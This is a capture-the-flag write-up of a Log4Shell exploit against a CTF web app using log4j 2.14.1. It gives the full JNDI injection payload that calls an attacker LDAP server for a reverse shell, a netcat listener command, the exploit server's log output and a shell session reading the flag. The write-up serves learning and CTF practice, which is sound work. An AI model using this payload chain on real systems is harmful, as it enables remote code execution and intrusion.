# Writeup

I saw in the [pom.xml](./source/pom.xml) that they used log4j 2.14.1. This one has the populare `log4shell` vulnerability. 

```xml
<dependency>
    <groupId>org.apache.logging.log4j</groupId>
    <artifactId>log4j-core</artifactId>
    <version>2.14.1</version>
</dependency>
```

My first thought was to spin up `jndi.jar` which I had from a previous challenge where they used the same exploit. 

```bash
$ java -jar jndi.jar -i <myserverip>
java -jar jndi.jar -i 0.0.0.0
[+] LDAP Server Start Listening on 1389...
[+] HTTP Server Start Listening on 8080...
```
Then opened a simple `nc` listening to port 1234 with `nc -knlvp 1234` and run a request using user-agent header as the payload bearer.

```bash
curl https://text-polyfill-982935551e3a.1753ctf.com/ -v -H "User-Agent: \${jndi:ldap://13.51.X.X:1389/Basic/ReverseShell/13.51.X.X/1234}"
```

But no, cloudfront was blocking my request. So I neeed to figure out if the server was vulnerable.
Looking at the code of [ImageTextServer.java](./source/src/main/java/com/ctf/ImageTextServer.java) I see that if it throws an exception while trying to add text to my image I will log the `text` parameter we ship. If we add the payload there and make it throw an exception.

@morty linked me to this [Log4Shell tester](http://mtest.malpasonline.co.uk/) which was a faster method to test so I used this until I found a working method.

I tried a lot of things:
- Invalid files (movies, exe, txt)
- Image with very small size
- Very long text after the payload
- Image with 5mb, 20mb

Then I thought maybe I could make it throw by just giving it evem bogger images? Memory exception? I tried to upload a 100MB file and it worked.

Now just startup jndi.jar and use the original payload and Profit!

```bash
$ java -jar jndi.jar -i 13.51.X.X
[+] LDAP Server Start Listening on 1389...
[+] HTTP Server Start Listening on 8080...
[+] Received LDAP Query: Basic/ReverseShell/13.51.X.X/1234
[+] Paylaod: reverseshell
[+] IP: 13.51.X.X
[+] Port: 1234
[+] Sending LDAP ResourceRef result for Basic/ReverseShell/13.51.X.X/1234 with basic remote reference payload
[+] Send LDAP reference result for Basic/ReverseShell/13.51.X.X/1234 redirecting to http://13.51.X.X:8080/Exploit6AooDuovcP.class

[+] Receive ClassRequest: Exploit6AooDuovcP.class
[+] Response Code: 200
```

And suddenly in my netcat window I had shell access and could get the flag. The flag seems to be in the environment variable `flag` according to the java file. 

```bash
nobody@648887927c45:/app$ echo $flag
1753c{generate_text_to_get_an_epic_rce}
```
